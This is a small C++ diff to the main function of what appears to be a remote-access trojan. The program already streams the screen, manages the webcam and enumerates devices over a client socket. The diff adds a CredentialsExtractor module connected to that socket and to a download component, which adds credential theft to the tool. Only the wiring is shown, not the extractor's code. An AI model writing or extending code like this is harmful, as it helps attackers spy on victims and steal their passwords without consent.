@@ -11,6 +11,7 @@
 #include "ClientSocket.h"
 #include "DeviceEnumerator.h"
 #include "Download.h"
+#include "CredentialsExtractor.h"
 
 
 std::map<std::string, std::shared_ptr<Stream>> connections;
@@ -110,6 +111,7 @@ int main(int argc = 0, char *argv[] = nullptr) {
         DeviceEnumerator deviceEnumerator(clientSocket);
         ScreenStreamer screenStreamer(clientSocket);
         WebcamManager webcamManager(clientSocket, download);
+        CredentialsExtractor credentialsExtractor(clientSocket, download);
         clientSocket.startConnection();
 
 
